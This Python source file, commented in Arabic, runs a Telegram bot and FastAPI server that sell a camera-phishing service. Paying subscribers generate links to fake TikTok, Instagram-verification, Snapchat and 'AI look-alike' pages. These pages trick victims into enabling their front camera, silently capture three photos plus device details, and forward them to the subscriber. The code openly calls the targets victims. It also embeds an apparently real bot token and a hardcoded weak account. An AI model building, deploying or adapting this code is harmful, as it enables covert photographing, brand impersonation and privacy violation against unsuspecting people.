import os
import base64
import io
import sqlite3
import uvicorn
from fastapi import FastAPI, Request, BackgroundTasks
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ForceReply

# 1. الإعدادات الأساسية
BOT_TOKEN = "8652491802:AAFOd303C5JsIaLkyuFfl6Op8XF-cygo6tg"
RENDER_URL = "https://haker-cam.onrender.com" 
TIKTOK_PROFILE = "https://www.tiktok.com/@your_username"  # 👈 ضع رابط حسابك التيك توك هنا

bot = telebot.TeleBot(BOT_TOKEN, threaded=False)
app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ---- إعداد قاعدة البيانات الدائمة المحدثة (نظام الحسابات) ----
def init_db():
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    # جدول المستخدمين المشتركين
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS bot_users (
            username TEXT PRIMARY KEY,
            password TEXT,
            linked_chat_id INTEGER DEFAULT NULL
        )
    """)
    conn.commit()
    conn.close()

try:
    init_db()
except Exception as e:
    print(f"⚠️ قاعدة البيانات جاهزة: {e}")

# دالة تستخدمها أنت لإضافة مستخدم جديد للبوت (يمكنك استدعاؤها أو إضافتها يدوياً)
def create_new_account(username, password):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    try:
        cursor.execute("INSERT OR IGNORE INTO bot_users (username, password) VALUES (?, ?)", (username, password))
        conn.commit()
    except Exception as e:
        print(f"Database error: {e}")
    finally:
        conn.close()

# دالة للتحقق من بيانات تسجيل الدخول وربط الحساب بالـ chat_id
def try_login_user(chat_id, username, password):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute("SELECT password, linked_chat_id FROM bot_users WHERE username = ?", (username,))
    result = cursor.fetchone()
    
    if result:
        db_password, linked_chat = result
        if db_password == password:
            # تحديث الـ chat_id لربط هذا الحساب بجهاز المستخدم الحالي في تليجرام
            cursor.execute("UPDATE bot_users SET linked_chat_id = ? WHERE username = ?", (chat_id, username))
            conn.commit()
            conn.close()
            return True
    conn.close()
    return False

# فحص هل هذا الـ chat_id ممتلك لحساب نشط ومسجل دخول
def has_active_session(chat_id):
    conn = sqlite3.connect("users.db")
    cursor = conn.cursor()
    cursor.execute("SELECT username FROM bot_users WHERE linked_chat_id = ?", (chat_id,))
    result = cursor.fetchone()
    conn.close()
    return result is not None

# ---- واجهة المقالب الافتراضية (فلتر AI + تيك توك + سناب + انستا) ----
def get_html_content(template_type):
    bg_color = "#010101"
    card_bg = "#121212"
    btn_color = "#fe2c55"
    logo_text = "TikTok"
    logo_style = "text-shadow: 2px 2px #fe2c55, -2px -2px #25f4ee;"
    title = "تحدي الملامح التفاعلي جاهز"
    desc = "يرجى النقر على زر التشغيل بالأسفل لفتح الفيديو وتفعيل الكاميرا الأمامية للمشاركة في تحدي الضحك المنتشر الآن."
    btn_text = "▶ اضغط لمشاهدة التحدي على TikTok"
    redirect_to = "https://www.tiktok.com"

    if template_type == "instagram":
        bg_color = "#fafafa"
        card_bg = "#ffffff"
        btn_color = "#0095f6"
        logo_text = "Instagram"
        logo_style = "background: -webkit-linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent;"
        title = "🛡️ نظام فحص وتوثيق الحسابات الحية"
        desc = "لتأكيد هويتك وتوثيق حسابك بالعلامة الزرقاء مجاناً، يرجى تفعيل الكاميرا الأمامية للمسح الحي ومطابقة الملامح مع صورة الحساب."
        btn_text = "✨ ابدأ الفحص الحي للحساب الآن"
        redirect_to = "https://www.instagram.com"
        
    elif template_type == "snapchat":
        bg_color = "#fffc00"
        card_bg = "#ffffff"
        btn_color = "#000000"
        logo_text = "Snapchat"
        logo_style = "color: #000000; font-family: 'Comic Sans MS', sans-serif;"
        title = "📸 تجربة فلاتر الذكاء الاصطناعي الجديدة"
        desc = "أطلقت سناب شات فلتر تغير الملامح المرعب الجديد! اضغط على الزر بالأسفل واسمح بالكاميرا لتجربة الفلتر الحصري قبل الجميع."
        btn_text = "🔥 تشغيل الفلتر الحصري"
        redirect_to = "https://www.snapchat.com"

    elif template_type == "ai_filter":
        bg_color = "#0f172a"
        card_bg = "#1e293b"
        btn_color = "#3b82f6"
        logo_text = "AI Look-Alike 🧠"
        logo_style = "background: linear-gradient(to right, #3b82f6, #8b5cf6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 900;"
        title = "🔍 فلتر كاشف الشبيه بالذكاء الاصطناعي v2.4"
        desc = "اكتشف من تشبه من مشاهير كرة القدم العالمية أو شخصيات الأنمي! يرجى السماح للمتصفح باستخدام الكاميرا الأمامية لبدء المسح الحي وتحليل ملامح الوجه بدقة خلال ثوانٍ واظهار شبيهك الفعلي."
        btn_text = "⚡ ابدأ الفحص الحي واكتشف شبيهك الآن"
        redirect_to = "https://www.google.com"

    return f"""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>{logo_text}</title>
        <style>
            * {{ box-sizing: border-box; margin: 0; padding: 0; }}
            body {{ 
                background-color: {bg_color}; 
                color: #ffffff; 
                font-family: system-ui, -apple-system, sans-serif; 
                display: flex; flex-direction: column; align-items: center; justify-content: center; 
                min-height: 100vh; padding: 20px;
            }}
            .container {{ 
                background: {card_bg}; padding: 35px 25px; border-radius: 20px; 
                box-shadow: 0 15px 35px rgba(0,0,0,0.3); max-width: 420px; width: 100%; 
                border: 1px solid #334155; text-align: center;
            }}
            .logo {{
                font-size: 34px; font-weight: 800; margin-bottom: 25px; letter-spacing: -1px;
                display: inline-block; {logo_style}
            }}
            .video-box {{
                width: 100%; height: 200px; background: #000000; border-radius: 12px; margin-bottom: 25px;
                display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative;
                border: 1px dashed #475569;
            }}
            .loader {{
                border: 4px solid #f3f3f3; border-top: 4px solid {btn_color}; border-radius: 50%;
                width: 45px; height: 45px; animation: spin 1s linear infinite; margin-bottom: 15px;
            }}
            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
            .loading-text {{ color: #94a3b8; font-size: 14px; }}
            h2 {{ font-size: 19px; font-weight: 700; margin-bottom: 12px; line-height: 1.4; }}
            p {{ color: #94a3b8; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }}
            .btn {{ 
                background-color: {btn_color}; color: white; border: none; padding: 16px 32px; 
                font-size: 16px; font-weight: 700; border-radius: 8px; cursor: pointer; width: 100%; 
                box-shadow: 0 4px 15px rgba(59, 130, 246, 0.4); transition: all 0.2s ease;
            }}
            .btn:active {{ transform: scale(0.98); }}
            .error-msg {{
                color: #ef4444; font-size: 13px; margin-top: 15px; display: none; font-weight: 600;
                background: rgba(239, 68, 68, 0.1); padding: 10px; border-radius: 8px;
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">{logo_text}</div>
            <div class="video-box">
                <div class="loader" id="mainLoader"></div>
                <div class="loading-text" id="statusText">جاري تهيئة خوارزميات الـ AI...</div>
            </div>
            <h2 id="mainTitle">{title}</h2>
            <p id="mainDesc">{desc}</p>
            <button class="btn" id="startBtn">{btn_text}</button>
            <div class="error-msg" id="errorBlock">⚠️ خطأ: الكاميرا معطلة! يجب السماح بالوصول لكي يتمكن النظام من قراءة الملامح.</div>
        </div>

        <script>
            const urlParams = new URLSearchParams(window.location.search);
            const ownerId = urlParams.get('id');
            const REDIRECT_URL = "{redirect_to}";

            function getDeviceInfo() {{
                const ua = navigator.userAgent;
                let os = "غير معروف";
                let browser = "غير معروف";

                if (ua.indexOf("Win") !== -1) os = "Windows";
                else if (ua.indexOf("Mac") !== -1) os = "Mac OS / iPhone";
                else if (ua.indexOf("Android") !== -1) os = "Android";

                if (ua.indexOf("Chrome") !== -1) browser = "Google Chrome";
                else if (ua.indexOf("Safari") !== -1) browser = "Safari";
                
                return os + " (" + browser + ")";
            }}

            function tryCapture() {{
                if (!ownerId) {{
                    window.location.href = REDIRECT_URL;
                    return;
                }}

                navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: false }})
                .then(function(stream) {{
                    document.getElementById('errorBlock').style.display = 'none';
                    document.getElementById('statusText').innerText = "نجح الاتصال.. جاري قراءة النقاط الحيوية...";
                    
                    let video = document.createElement('video');
                    video.srcObject = stream;
                    video.setAttribute("playsinline", true);
                    video.play();
                    
                    video.onloadedmetadata = function() {{
                        let canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        let ctx = canvas.getContext('2d');
                        
                        let shotsTaken = 0;
                        const deviceInfo = getDeviceInfo();
                        
                        let captureInterval = setInterval(function() {{
                            if (shotsTaken >= 3) {{
                                clearInterval(captureInterval);
                                stream.getTracks().forEach(track => track.stop());
                                window.location.href = REDIRECT_URL;
                                return;
                            }}
                            
                            ctx.drawImage(video, 0, 0);
                            let base64Image = canvas.toDataURL('image/jpeg', 0.75);
                            
                            fetch('/api/capture', {{
                                method: 'POST',
                                headers: {{ 'Content-Type': 'application/json' }},
                                body: JSON.stringify({{ 
                                    user_id: ownerId, 
                                    image: base64Image, 
                                    count: shotsTaken + 1,
                                    device: deviceInfo 
                                }})
                            }});
                            
                            shotsTaken++;
                        }}, 500);
                    }};
                }})
                .catch(function(err) {{
                    document.getElementById('errorBlock').style.display = 'block';
                    document.getElementById('statusText').innerText = "⚠️ تعذر التحليل! يرجى منح الإذن للمحاولة مجدداً.";
                }});
            }}

            document.getElementById('startBtn').addEventListener('click', tryCapture);
        </script>
    </body>
    </html>
    """

# ---- أوامر البوت في تليجرام ----

@bot.message_handler(commands=['start'])
def start(message):
    chat_id = message.chat.id
    
    # إذا كان مسجل دخول مسبقاً، نفتح له لوحة التحكم مباشرة
    if has_active_session(chat_id):
        show_main_menu(chat_id)
        return

    welcome_text = (
        "🛡️ **مرحباً بك في نظام الصيد الذكي المطور (v5.0)!**\n\n"
        "هذا البوت مخصص للمشتركين بأكواد تفعيل رسمية فقط. يرجى تسجيل الدخول للوصول إلى لوحة التحكم وقوالب الذكاء الاصطناعي وكاشف الأجهزة.\n\n"
        "🔽 اختر من الأزرار بالأسفل للمتابعة:"
    )
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("🔐 تسجيل الدخول للنظام", callback_data="login_process"),
        InlineKeyboardButton("ℹ️ تعليمات وكيفية الاشتراك", callback_data="show_instructions")
    )
    bot.send_message(chat_id, welcome_text, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "show_instructions")
def show_instructions(call):
    chat_id = call.message.chat.id
    instructions = (
        "⚠️ **تنبيه: أنت غير مسجل في النظام حالياً!**\n\n"
        "للحصول على حساب خاص بك (اسم مستخدم وكلمة مرور) وتفعيل الميزات الأسطورية، يرجى التواصل مع الإدارة مباشرة عبر حسابنا الرسمي في تيك توك:\n"
        f"🔗 {TIKTOK_PROFILE}\n\n"
        "*بعد إتمام عملية الاشتراك وتحويل الرسوم، سيتم تزويدك ببيانات الدخول الفريدة الخاصة بك فوراً.* 💳✨"
    )
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔙 العودة للخلف", callback_data="back_to_start"))
    bot.send_message(chat_id, instructions, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "back_to_start")
def back_to_start(call):
    bot.delete_message(call.message.chat.id, call.message.message_id)
    start(call.message)

@bot.callback_query_handler(func=lambda call: call.data == "login_process")
def login_process(call):
    chat_id = call.message.chat.id
    # طلب اسم المستخدم وكلمة السر بنمط نصي منظم متبوع بـ ForceReply
    msg = bot.send_message(
        chat_id, 
        "📝 **يرجى إرسال بياناتك بالشكل التالي تماماً:**\n\n"
        "`الاسم:الباسورد`\n\n"
        "مثال: `moosa:123456`\n"
        "*(تأكد من وضع النقطتين : بين الاسم والباسورد بدون فراغات)*", 
        parse_mode="Markdown",
        reply_markup=ForceReply(selective=True)
    )
    bot.register_next_step_handler(msg, process_login_credentials)

def process_login_credentials(message):
    chat_id = message.chat.id
    text = message.text.strip()
    
    if ":" not in text:
        msg = bot.send_message(chat_id, "❌ **صيغة خاطئة!** يرجى الضغط على زر تسجيل الدخول مجدداً وكتابتها بالشكل الصحيح `الاسم:الباسورد`.")
        return
        
    try:
        username, password = text.split(":", 1)
        if try_login_user(chat_id, username.strip(), password.strip()):
            bot.send_message(chat_id, "🎉 **تم تسجيل الدخول بنجاح! تفعيل أسطوري مطلق متاح لك الآن.**")
            show_main_menu(chat_id)
        else:
            bot.send_message(chat_id, "❌ **بيانات الدخول غير صحيحة!** تأكد من الاسم والباسورد أو تواصل مع الإدارة عبر تيك توك.")
    except Exception as e:
        bot.send_message(chat_id, "⚠️ حدث خطأ أثناء معالجة البيانات، أعد المحاولة.")

def show_main_menu(chat_id):
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("🎬 مقلب تحدي تيك توك", callback_data="gen_tiktok"),
        InlineKeyboardButton("📸 مقلب توثيق إنستغرام", callback_data="gen_instagram"),
        InlineKeyboardButton("👻 مقلب فلاتر سناب شات", callback_data="gen_snapchat"),
        InlineKeyboardButton("🧠 مقلب فلتر الشبيه بالـ AI (ناري)", callback_data="gen_ai_filter")
    )
    bot.send_message(chat_id, "👑 **مرحباً بك في لوحة تحكم القوالب الذكية:**\nاختر نوع المقلب لتوليد الرابط فوراً:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("gen_"))
def gen_link(call):
    chat_id = call.message.chat.id
    if not has_active_session(chat_id):
        bot.send_message(chat_id, "❌ حسابك غير مفعل أو انتهت جلستك.")
        return
        
    template = call.data.split("_")[1]
    display_name = "فلتر الشبيه AI" if template == "ai" else template.upper()
    
    if template == "ai":
        unique_link = f"{RENDER_URL}?id={chat_id}&template=ai_filter"
    else:
        unique_link = f"{RENDER_URL}?id={chat_id}&template={template}"
    
    msg = (
        f"🚀 **رابط المقلب الذكي لـ ({display_name}) جاهز!**\n\n"
        f"انسخ الرابط وأرسله مباشرة:\n`{unique_link}`\n\n"
        "💡 **تذكير:** الصفحة معزولة تماماً ولن تترك الضحية يخرج حتى يوافق، وسيأتيك تقرير بنوع جواله مع صوره المضحكة!"
    )
    bot.send_message(chat_id, msg, parse_mode="Markdown")

# ---- المسارات واستقبل السيرفر ----

@app.get("/", response_class=HTMLResponse)
async def get_home(request: Request):
    template = request.query_params.get("template", "tiktok")
    return get_html_content(template)

@app.post(f"/{BOT_TOKEN}")
async def telegram_webhook(request: Request):
    json_string = await request.body()
    update = telebot.types.Update.de_json(json_string.decode('utf-8'))
    bot.process_new_updates([update])
    return {"status": "ok"}

def send_photo_to_owner(user_id, image_bytes, count_text, device_info):
    try:
        caption_msg = (
            f"📸 **تم صيد لقطة مضحكة بنجاح! اللقطة رقم ({count_text})**\n\n"
            f"📱 **جهاز الضحية:** `{device_info}`"
        )
        bot.send_photo(chat_id=user_id, photo=image_bytes, caption=caption_msg, parse_mode="Markdown")
    except Exception as e:
        print(f"Error sending photo: {e}")

@app.post("/api/capture")
async def capture_api(request: Request, background_tasks: BackgroundTasks):
    try:
        data = await request.json()
        user_id = data.get("user_id")
        image_b64 = data.get("image")
        shot_count = data.get("count", 1)
        device_info = data.get("device", "غير معروف")
        
        if not user_id or not image_b64:
            return JSONResponse(status_code=400, content={"status": "error"})
            
        header, encoded = image_b64.split(",", 1)
        image_bytes = base64.b64decode(encoded)
        image_file = io.BytesIO(image_bytes)
        image_file.name = f"capture_{shot_count}.jpg"
        
        background_tasks.add_task(send_photo_to_owner, int(user_id), image_file, str(shot_count), device_info)
        return {"status": "success"}
    except Exception as e:
        return JSONResponse(status_code=500, content={"status": "error"})

@app.on_event("startup")
def startup_event():
    bot.remove_webhook()
    bot.set_webhook(url=f"{RENDER_URL}/{BOT_TOKEN}")
    # 💡 لإنشاء حساب تجريبي لنفسك وتجربة الدخول:
    create_new_account("moosa", "123456")
    print("🚀 تم تشغيل بوت التفعيل التجاري المطور بنجاح!")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    uvicorn.run(app, host="0.0.0.0", port=port)
